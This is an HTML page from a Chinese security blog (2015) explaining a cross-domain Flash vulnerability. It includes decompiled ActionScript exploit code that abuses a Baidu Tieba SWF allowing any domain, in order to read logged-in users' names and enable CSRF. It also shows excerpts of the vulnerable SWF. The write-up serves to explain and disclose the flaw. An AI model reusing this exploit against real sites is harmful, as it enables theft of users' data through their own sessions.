@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>flash被跨域调用导致的安全风险 - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="flash被跨域调用导致的安全风险 - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/287/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            
+        </div>
+        <h1>flash被跨域调用导致的安全风险</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2015-06-17 22:25"><i class="iconfont icon-date"></i>2015-06-17 22:25</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>flash也是可以和js一样动态的请求和加载，类似这样
+a.com上的a.swf</p>
+<div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">myLoader</span><span class="err">:</span><span class="nx">Loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Loader</span><span class="p">();</span>                     
+<span class="kd">var</span> <span class="nx">url</span><span class="err">:</span><span class="nx">URLRequest</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLRequest</span><span class="p">(</span><span class="s2">"http://b.com/b.swf"</span><span class="p">);</span> 
+<span class="nx">myLoader</span><span class="p">.</span><span class="nx">load</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+<span class="nx">addChild</span><span class="p">(</span><span class="nx">myLoader</span><span class="p">);</span>  
+</code></pre>
+</div>
+<p>但是默认情况下是swf是不能被跨域引用的，所以这个调用不一定成功，只有在b.swf设置了<code class="highlighter-rouge">System.security.allowDomain("a.com")</code>或者<code class="highlighter-rouge">System.security.allowDomain("*")</code>的情况下才可以。</p>
+
+<p>这样的话，b.swf中的有一些方法就可以在a.swf中调用了，而且发送的请求会显示来自b.swf，造成了跨域请求，大部分的浏览器是携带cookies的（貌似safari不发送）。</p>
+
+<p>在 <a href="http://weibo.com/2313289447/CmZQrqa4R?type=comment">http://weibo.com/2313289447/CmZQrqa4R?type=comment</a> 里面有一个跨域获取百度贴吧用户名的demo，就是利用了百度贴吧里面一个swf的这个漏洞。swf在这也<a href="https://dn-virusdefender-blog.qbox.me/2016/437876600.swf">备份了一个</a>。</p>
+
+<!--more-->
+
+<p>首先看一下exp的反编译后的代码。</p>
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kn">package</span> <span class="o">{</span>
+    <span class="kn">import</span> <span class="nn">flash.utils.*</span><span class="o">;</span>
+    <span class="kn">import</span> <span class="nn">flash.display.*</span><span class="o">;</span>
+    <span class="kn">import</span> <span class="nn">flash.system.*</span><span class="o">;</span>
+    <span class="kn">import</span> <span class="nn">flash.net.*</span><span class="o">;</span>
+    <span class="kn">import</span> <span class="nn">flash.events.*</span><span class="o">;</span>
+    <span class="kn">import</span> <span class="nn">flash.external.*</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">exp</span> <span class="kd">extends</span> <span class="n">Sprite</span> <span class="o">{</span>
+
+        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="nl">PATH:</span><span class="n">String</span> <span class="o">=</span> <span class="s">"baidu.vote.DataManager"</span><span class="o">;</span>
+        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="nl">URL:</span><span class="n">String</span> <span class="o">=</span> <span class="s">"http://tieba.baidu.com/tb/static-itieba3/swf/itiebaVote.swf"</span><span class="o">;</span>
+
+        <span class="kd">private</span> <span class="n">var</span> <span class="n">clsExp</span><span class="o">;</span>
+        <span class="kd">private</span> <span class="n">var</span> <span class="n">clsRes</span><span class="o">;</span>
+        <span class="kd">private</span> <span class="n">var</span> <span class="nl">nick:</span><span class="n">String</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">exp</span><span class="o">(){</span>
+            <span class="n">var</span> <span class="nl">ld:</span><span class="o">*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="n">var</span> <span class="nl">tid:</span><span class="o">*</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+            <span class="kd">super</span><span class="o">();</span>
+            <span class="n">Security</span><span class="o">.</span><span class="na">allowDomain</span><span class="o">(</span><span class="s">"*"</span><span class="o">);</span>
+            <span class="n">ld</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Loader</span><span class="o">();</span>
+            <span class="n">ld</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="k">new</span> <span class="n">URLRequest</span><span class="o">(</span><span class="n">URL</span><span class="o">));</span>
+            <span class="n">addChild</span><span class="o">(</span><span class="n">ld</span><span class="o">);</span>
+            <span class="n">tid</span> <span class="o">=</span> <span class="n">setInterval</span><span class="o">(</span><span class="n">function</span> <span class="o">():</span><span class="kt">void</span><span class="o">{</span>
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="n">clsExp</span> <span class="o">=</span> <span class="n">ld</span><span class="o">.</span><span class="na">contentLoaderInfo</span><span class="o">.</span><span class="na">applicationDomain</span><span class="o">.</span><span class="na">getDefinition</span><span class="o">(</span><span class="n">PATH</span><span class="o">);</span>
+                    <span class="n">clsRes</span> <span class="o">=</span> <span class="n">ld</span><span class="o">.</span><span class="na">contentLoaderInfo</span><span class="o">.</span><span class="na">applicationDomain</span><span class="o">.</span><span class="na">getDefinition</span><span class="o">(</span><span class="s">"baidu.vote.enumerate.Constants"</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="nl">e:</span><span class="n">Error</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">return</span><span class="o">;</span>
+                <span class="o">};</span>
+                <span class="n">clearInterval</span><span class="o">(</span><span class="n">tid</span><span class="o">);</span>
+                <span class="n">ready</span><span class="o">();</span>
+            <span class="o">},</span> <span class="mi">100</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="kd">private</span> <span class="n">function</span> <span class="nf">load</span><span class="o">(</span><span class="nl">url:</span><span class="n">String</span><span class="o">):</span><span class="kt">void</span><span class="o">{</span>
+            <span class="n">var</span> <span class="nl">obj:</span><span class="o">*</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">clsExp</span><span class="o">.</span><span class="na">getInstance</span><span class="o">();</span>
+            <span class="n">obj</span><span class="o">.</span><span class="na">requestPageData</span><span class="o">({</span>
+                <span class="nl">r:</span><span class="mi">1</span><span class="o">,</span>
+                <span class="nl">voteId:</span><span class="mi">1</span><span class="o">,</span>
+                <span class="nl">tn:</span><span class="mi">1</span>
+            <span class="o">});</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">clsRes</span><span class="o">.</span><span class="na">URL_VOTE_DETAIL</span> <span class="o">=</span> <span class="o">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"#"</span><span class="o">);</span>
+            <span class="n">obj</span><span class="o">.</span><span class="na">requestVoteDetail</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="kd">private</span> <span class="n">function</span> <span class="nf">ready</span><span class="o">():</span><span class="kt">void</span><span class="o">{</span>
+            <span class="n">loaderInfo</span><span class="o">.</span><span class="na">uncaughtErrorEvents</span><span class="o">.</span><span class="na">addEventListener</span><span class="o">(</span><span class="n">UncaughtErrorEvent</span><span class="o">.</span><span class="na">UNCAUGHT_ERROR</span><span class="o">,</span> <span class="n">function</span> <span class="o">(</span><span class="nl">e:</span><span class="n">UncaughtErrorEvent</span><span class="o">):</span><span class="kt">void</span><span class="o">{</span>
+                <span class="n">complete</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">error</span><span class="o">.</span><span class="na">text</span><span class="o">);</span>
+            <span class="o">});</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="s">"http://tieba.baidu.com/"</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="kd">private</span> <span class="n">function</span> <span class="nf">complete</span><span class="o">(</span><span class="nl">data:</span><span class="n">String</span><span class="o">):</span><span class="kt">void</span><span class="o">{</span>
+            <span class="n">var</span> <span class="nl">arr:</span><span class="n">Array</span><span class="o">;</span>
+            <span class="n">arr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">match</span><span class="o">(/</span><span class="s">"name"</span><span class="o">:</span> <span class="s">"([^"</span><span class="o">]+)/);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">arr</span><span class="o">){</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">nick</span> <span class="o">=</span> <span class="n">arr</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span>
+            <span class="o">};</span>
+            <span class="n">ExternalInterface</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="s">"bdcallback"</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">nick</span><span class="o">);</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+<span class="o">}</span><span class="c1">//package</span>
+</code></pre>
+</div>
+<p>加载了<code class="highlighter-rouge">http://tieba.baidu.com/tb/static-itieba3/swf/itiebaVote.swf</code>这个swf，然后调用了里面的<code class="highlighter-rouge">requestVoteDetail</code>方法，我们再反编译一下百度贴吧的swf，看看这个方法是干什么的。</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kd">private</span> <span class="n">function</span> <span class="nf">initialize</span><span class="o">():</span><span class="kt">void</span><span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">useCodePage</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+            <span class="n">Security</span><span class="o">.</span><span class="na">allowDomain</span><span class="o">(</span><span class="s">"*"</span><span class="o">);</span>
+            <span class="n">stage</span><span class="o">.</span><span class="na">scaleMode</span> <span class="o">=</span> <span class="s">"noScale"</span><span class="o">;</span>
+            <span class="o">......</span>
+</code></pre>
+</div>
+
+<p>请求网络的代码</p>
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kd">public</span> <span class="n">function</span> <span class="nf">requestVoteDetail</span><span class="o">():</span><span class="kt">void</span><span class="o">{</span>
+            <span class="n">var</span> <span class="nl">_local1:</span><span class="n">String</span> <span class="o">=</span> <span class="n">Constants</span><span class="o">.</span><span class="na">URL_VOTE_DETAIL</span><span class="o">;</span>
+            <span class="n">_local1</span> <span class="o">=</span> <span class="o">(</span><span class="n">_local1</span> <span class="o">+</span> <span class="n">pageData</span><span class="o">.</span><span class="na">voteId</span><span class="o">);</span>
+            <span class="n">_local1</span> <span class="o">=</span> <span class="o">(</span><span class="n">_local1</span> <span class="o">+</span> <span class="o">(</span><span class="s">"?alt=json&amp;stamp="</span> <span class="o">+</span> <span class="n">Math</span><span class="o">.</span><span class="na">random</span><span class="o">()));</span>
+            <span class="n">var</span> <span class="nl">_local2:</span><span class="n">URLRequest</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLRequest</span><span class="o">(</span><span class="n">_local1</span><span class="o">);</span>
+            <span class="n">var</span> <span class="nl">_local3:</span><span class="n">URLLoader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLLoader</span><span class="o">();</span>
+            <span class="n">_local3</span><span class="o">.</span><span class="na">addEventListener</span><span class="o">(</span><span class="n">Event</span><span class="o">.</span><span class="na">COMPLETE</span><span class="o">,</span> <span class="n">onVoteDetailComplete</span><span class="o">);</span>
+            <span class="n">_local3</span><span class="o">.</span><span class="na">addEventListener</span><span class="o">(</span><span class="n">IOErrorEvent</span><span class="o">.</span><span class="na">IO_ERROR</span><span class="o">,</span> <span class="n">onVoteDetailError</span><span class="o">);</span>
+            <span class="n">_local3</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="n">_local2</span><span class="o">);</span>
+        <span class="o">}</span>
+</code></pre>
+</div>
+<p>处理访问数据的方法</p>
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kd">private</span> <span class="n">function</span> <span class="nf">onVoteDetailComplete</span><span class="o">(</span><span class="nl">_arg1:</span><span class="n">Event</span><span class="o">):</span><span class="kt">void</span><span class="o">{</span>
+            <span class="n">var</span> <span class="nl">_local2:</span><span class="n">URLLoader</span> <span class="o">=</span> <span class="o">(</span><span class="n">_arg1</span><span class="o">.</span><span class="na">currentTarget</span> <span class="n">as</span> <span class="n">URLLoader</span><span class="o">);</span>
+            <span class="n">_local2</span><span class="o">.</span><span class="na">removeEventListener</span><span class="o">(</span><span class="n">Event</span><span class="o">.</span><span class="na">COMPLETE</span><span class="o">,</span> <span class="n">onVoteDetailComplete</span><span class="o">);</span>
+            <span class="n">_local2</span><span class="o">.</span><span class="na">removeEventListener</span><span class="o">(</span><span class="n">IOErrorEvent</span><span class="o">.</span><span class="na">IO_ERROR</span><span class="o">,</span> <span class="n">onVoteDetailError</span><span class="o">);</span>
+            <span class="n">var</span> <span class="nl">_local3:</span><span class="n">String</span> <span class="o">=</span> <span class="o">(</span><span class="n">_local2</span><span class="o">.</span><span class="na">data</span> <span class="n">as</span> <span class="n">String</span><span class="o">);</span>
+            <span class="n">_voteDetail</span> <span class="o">=</span> <span class="n">VoteDetail</span><span class="o">.</span><span class="na">fromJsonString</span><span class="o">(</span><span class="n">_local3</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(((</span><span class="n">_voteDetail</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">((</span><span class="n">_voteDetail</span><span class="o">.</span><span class="na">errno</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)))){</span>
+                <span class="n">dispatchEvent</span><span class="o">(</span><span class="k">new</span> <span class="n">DataManagerEvent</span><span class="o">(</span><span class="n">DataManagerEvent</span><span class="o">.</span><span class="na">VOTE_DETAIL_OK</span><span class="o">));</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="n">dispatchEvent</span><span class="o">(</span><span class="k">new</span> <span class="n">DataManagerEvent</span><span class="o">(</span><span class="n">DataManagerEvent</span><span class="o">.</span><span class="na">VOTE_DETAIL_ERROR</span><span class="o">));</span>
+            <span class="o">};</span>
+        <span class="o">}</span>
+</code></pre>
+</div>
+<p>然后是json解码</p>
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="n">function</span> <span class="nf">fromJsonString</span><span class="o">(</span><span class="nl">_arg1:</span><span class="n">String</span><span class="o">,</span> <span class="nl">_arg2:</span><span class="n">Boolean</span><span class="o">=</span><span class="kc">false</span><span class="o">):</span><span class="n">VoteDetail</span><span class="o">{</span>
+            <span class="n">var</span> <span class="nl">_local3:</span><span class="n">Object</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">_arg1</span><span class="o">);</span>
+            <span class="k">return</span> <span class="o">(</span><span class="n">fromObject</span><span class="o">(</span><span class="n">_local3</span><span class="o">,</span> <span class="n">_arg2</span><span class="o">));</span>
+        <span class="o">}</span>
+</code></pre>
+</div>
+<p>但是这个地方请求获取的是html，不是json，所以处理就会抛出异常，自己catch住就好了，异常的信息里面是包含html的。</p>
+
+<p>这样就造成了一个跨域读取的漏洞，不仅仅是获取用户名，更可以csrf啊。</p>
+
+<p>ps: 在wooyun上搜flash漏洞的时候，我才发现这个漏洞其实已经被报告给百度了，竟然还没修复，23333333</p>
+
+<p>参考</p>
+
+<p><a href="http://www.cnblogs.com/index-html/p/swf-reflect-priv.html">http://www.cnblogs.com/index-html/p/swf-reflect-priv.html</a></p>
+
+<p><a href="http://wooyun.org/bugs/wooyun-2010-0110065">http://wooyun.org/bugs/wooyun-2010-0110065</a></p>
+
+<p>其他的flash安全相关的文章 <a href="http://drops.wooyun.org/tips/2924">http://drops.wooyun.org/tips/2924</a></p>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=flash被跨域调用导致的安全风险&article_id=/index.php/archives/287/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
